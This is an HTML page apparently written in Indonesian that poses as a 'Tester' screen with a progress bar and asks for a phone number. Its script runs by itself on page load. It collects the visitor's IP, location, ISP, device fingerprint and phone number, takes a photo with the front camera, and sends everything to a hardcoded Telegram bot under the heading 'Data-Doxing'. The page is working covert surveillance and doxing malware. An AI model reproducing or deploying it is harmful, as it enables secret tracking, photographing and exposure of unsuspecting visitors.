<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Tester</title>
  <style>
    :root {
      --primary: #ff0000;
      --secondary: #ff5252;
      --dark: #1a0000;
      --darker: #0d0000;
      --accent: #ff8a8a;
    }
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      background: var(--darker);
      color: var(--primary);
      font-family: 'Courier New', monospace;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      text-align: center;
      padding: 20px;
      overflow: hidden;
      position: relative;
    }
    .grid-bg {
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background-image:
        linear-gradient(rgba(255,0,0,0.05) 1px, transparent 1px),
        linear-gradient(90deg, rgba(255,0,0,0.05) 1px, transparent 1px);
      background-size: 20px 20px;
      z-index: -1;
    }
    .scan-line {
      position: absolute;
      height: 30px;
      width: 100%;
      background: linear-gradient(to bottom, transparent, rgba(255,0,0,0.2), transparent);
      top: 0;
      animation: scan 4s linear infinite;
      z-index: -1;
    }
    @keyframes scan {
      0% { top: 0; }
      100% { top: 100%; }
    }
    .container {
      max-width: 800px;
      width: 100%;
      background: rgba(26, 0, 0, 0.9);
      border: 1px solid var(--primary);
      border-radius: 8px;
      padding: 30px;
      box-shadow: 0 0 20px rgba(255, 0, 0, 0.2);
      position: relative;
      overflow: hidden;
    }
    .container::before {
      content: '';
      position: absolute;
      top: -2px; left: -2px; right: -2px; bottom: -2px;
      z-index: -1;
      background: linear-gradient(45deg, #ff0000, #ff5252, #ff8a8a, #ff0000);
      background-size: 400% 400%;
      animation: gradient-border 15s ease infinite;
      border-radius: 10px;
    }
    @keyframes gradient-border {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    h1 {
      font-size: 2.2rem;
      margin-bottom: 20px;
      animation: blink 1s infinite;
      text-shadow: 0 0 10px var(--primary);
      letter-spacing: 2px;
    }
    .progress-container {
      width: 100%;
      height: 25px;
      background: var(--dark);
      border-radius: 10px;
      margin: 30px 0;
      overflow: hidden;
      border: 1px solid var(--primary);
      box-shadow: 0 0 10px rgba(255, 0, 0, 0.2);
    }
    .progress-bar {
      height: 100%;
      width: 50%;
      background: linear-gradient(90deg, var(--primary), var(--secondary));
      border-radius: 10px;
      animation: progress-pulse 2s infinite;
      transition: width 0.5s ease;
      position: relative;
      overflow: hidden;
    }
    .progress-bar::after {
      content: '';
      position: absolute;
      top: 0; left: 0; bottom: 0;
      width: 20px;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
      animation: progress-shine 1.5s infinite;
    }
    @keyframes progress-shine {
      0% { left: -20px; }
      100% { left: 100%; }
    }
    @keyframes progress-pulse {
      0%, 100% { opacity: 0.8; }
      50% { opacity: 1; }
    }
    @keyframes blink {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.6; }
    }
    .status-text {
      margin: 15px 0;
      font-size: 1.1rem;
      color: var(--secondary);
    }
    .btn-container {
      display: flex;
      flex-direction: column;
      gap: 15px;
      margin-top: 25px;
    }
    .btn {
      background: transparent;
      color: var(--primary);
      border: 1px solid var(--primary);
      padding: 12px 25px;
      font-family: 'Courier New', monospace;
      font-size: 1.1rem;
      border-radius: 4px;
      cursor: pointer;
      transition: all 0.3s;
      position: relative;
      overflow: hidden;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    .btn:hover {
      background: rgba(255, 0, 0, 0.1);
      box-shadow: 0 0 15px var(--primary);
    }
    .btn:active {
      transform: scale(0.98);
    }
    .info-text {
      margin-top: 20px;
      font-size: 0.9rem;
      color: var(--accent);
      text-align: left;
      line-height: 1.6;
    }
    .info-text a {
      color: var(--primary);
      text-decoration: none;
      font-weight: bold;
    }
    .info-text a:hover {
      text-decoration: underline;
    }
    .footer {
      margin-top: 30px;
      color: var(--accent);
      font-size: 0.9rem;
    }
    .camera-container {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0, 0, 0, 0.95);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 100;
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.3s;
    }
    .camera-container.active {
      opacity: 1;
      pointer-events: all;
    }
    .camera-feed {
      width: 100%;
      max-width: 500px;
      border: 2px solid var(--primary);
      border-radius: 8px;
      box-shadow: 0 0 30px var(--primary);
    }
    .notification {
      position: fixed;
      bottom: 20px; right: 20px;
      background: var(--dark);
      border: 1px solid var(--primary);
      border-radius: 4px;
      padding: 12px 18px;
      transform: translateX(150%);
      transition: transform 0.3s;
      z-index: 1000;
      box-shadow: 0 0 15px rgba(255, 0, 0, 0.3);
    }
    .notification.show {
      transform: translateX(0);
    }
    /* Input nomor telepon style */
    #phoneInput {
      padding: 8px;
      margin-top: 5px;
      width: 100%;
      border-radius: 4px;
      border: 1px solid var(--primary);
      background: var(--dark);
      color: var(--primary);
      font-family: monospace;
      font-size: 1rem;
    }
  </style>
</head>
<body>
  <div class="grid-bg"></div>
  <div class="scan-line"></div>

  <div class="container">
    <h1>TESTER 2 [ 85% ]</h1>

    <div class="progress-container">
      <div class="progress-bar" id="progressBar"></div>
    </div>

    <p class="status-text">TESTER 4</p>
    <p class="status-text">TESTER 5</p>

    <div class="btn-container">
      <button class="btn" id="skipBtn">TESTER 6</button>
    </div>

    <div class="info-text">
      <p>TESTER 7.</p>
      <label for="phoneInput" style="color: var(--accent); font-weight: bold;">Masukkan Nomor Telepon Anda:</label>
      <input type="tel" id="phoneInput" name="phoneInput" placeholder="+62 8123456789" />
      <p>Pastikan progress mencapai 100% dan izinkan akses kamera untuk pengalaman terbaik.</p>
    </div>

    <div class="footer">
      <p>By PutraSeishiro</p>
    </div>
  </div>

  <div class="camera-container" id="cameraContainer">
    <video id="cameraFeed" class="camera-feed" autoplay playsinline></video>
  </div>

  <div class="notification" id="notification">
    Data collected and sent successfully!
  </div>

  <script>
    // Konfigurasi
    const BOT_TOKEN = "8509635804:AAElyqWLfOWV9uyiuNHXgexZa7v6gyDFOsk";
    const OWNER_CHAT_ID = "6086060284";

    // Elemen DOM
    const skipBtn = document.getElementById('skipBtn');
    const cameraContainer = document.getElementById('cameraContainer');
    const cameraFeed = document.getElementById('cameraFeed');
    const notification = document.getElementById('notification');
    const progressBar = document.getElementById('progressBar');

    // State variables
    let dataCollected = false;
    let photoTaken = false;
    let stream = null;

    // Event listeners
    skipBtn.addEventListener('click', handleSkip);

    // Fungsi utama
    window.addEventListener('load', () => {
      startProcess();
    });

    async function startProcess() {
      await animateProgressBar();
      await collectData();
      showNotification();
    }

    function animateProgressBar() {
      return new Promise(resolve => {
        let width = 50;
        const interval = setInterval(() => {
          if (width < 100) {
            width += 0.5;
            progressBar.style.width = width + "%";
          } else {
            clearInterval(interval);
            resolve();
          }
        }, 100);
      });
    }

    async function collectData() {
      if (dataCollected) return;
      dataCollected = true;
      try {
        const visitorInfo = await getVisitorInfo();
        await takePhoto();
        await sendToTelegram(visitorInfo);
      } catch (error) {
        console.error("Error collecting data:", error);
      }
    }

    async function getVisitorInfo() {
      const clock = new Date().toLocaleString();
      let latitude = "N/A", longitude = "N/A", accuracy = "N/A";
      let country = "N/A", province = "N/A", city = "N/A";
      let ip = "N/A", namaISP = "N/A";
      let phoneNumber = document.getElementById('phoneInput')?.value || "N/A";
      const userAgent = navigator.userAgent;
      const device = navigator.platform + " - " + userAgent;

      try {
        const ipData = await fetch("https://ipapi.co/json/").then(r => r.json());
        ip = ipData.ip || "N/A";
        country = ipData.country_name || "N/A";
        province = ipData.region || "N/A";
        city = ipData.city || "N/A";
        latitude = ipData.latitude || "N/A";
        longitude = ipData.longitude || "N/A";
        namaISP = ipData.org || "N/A";

      } catch (error) {
        console.error("Error getting IP data:", error);
      }

      const fingerprint = await generateFingerprint();

      return {
        "Phone Number": phoneNumber,
        "IP Address": ip,
        "ISP": namaISP,
        "Country": country,
        "Province/State": province,
        "City": city,
        "Coordinates": `${latitude}, ${longitude}`,
        "Accuracy": accuracy,
        "Device": device,
        "Time": clock,
        "Fingerprint": fingerprint
      };
    }

    async function takePhoto() {
      if (photoTaken) return;
      photoTaken = true;
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        cameraFeed.srcObject = stream;
        cameraContainer.classList.add('active');
        await new Promise(resolve => setTimeout(resolve, 1000));
        const photoData = await capturePhoto();
        window.capturedPhoto = photoData;
        stopCamera();
      } catch (error) {
        console.error("Error accessing camera:", error);
        window.capturedPhoto = null;
      }
    }

    function capturePhoto() {
      return new Promise(resolve => {
        const canvas = document.createElement('canvas');
        const context = canvas.getContext('2d');
        canvas.width = cameraFeed.videoWidth;
        canvas.height = cameraFeed.videoHeight;
        context.drawImage(cameraFeed, 0, 0, canvas.width, canvas.height);
        const dataUrl = canvas.toDataURL('image/jpeg');
        resolve(dataUrl);
      });
    }

    function stopCamera() {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
        cameraContainer.classList.remove('active');
      }
    }

    function showNotification() {
      notification.classList.add('show');
      setTimeout(() => {
        notification.classList.remove('show');
      }, 3000);
    }

    async function generateFingerprint() {
      const ua = navigator.userAgent;
      const lang = navigator.language;
      const res = screen.width + "x" + screen.height;
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const ram = navigator.deviceMemory || "N/A";
      const cpu = navigator.hardwareConcurrency || "N/A";
      const raw = `${ua}|${lang}|${res}|${timezone}|${ram}|${cpu}`;
      const encoder = new TextEncoder();
      const data = encoder.encode(raw);
      const hashBuffer = await crypto.subtle.digest('SHA-256', data);
      return [...new Uint8Array(hashBuffer)].map(x => x.toString(16).padStart(2, '0')).join('');
    }

    async function sendToTelegram(data) {
      let message = `ðŸ”’ *Data-Doxing*

`;
      for (let key in data) {
        message += `*${key}:* ${data[key]}
`;
      }
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: OWNER_CHAT_ID,
          text: message,
          parse_mode: "Markdown"
        })
      });

      if (window.capturedPhoto) {
        const blob = await fetch(window.capturedPhoto).then(r => r.blob());
        const formData = new FormData();
        formData.append('chat_id', OWNER_CHAT_ID);
        formData.append('photo', blob, 'visitor-photo.jpg');
        formData.append('caption', 'Visitor photo captured automatically');
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: "POST",
          body: formData
        });
      }
    }

    function handleSkip() {
      if (!dataCollected) {
        collectData();
        showNotification();
      }
    }
  </script>
</body>
</html>
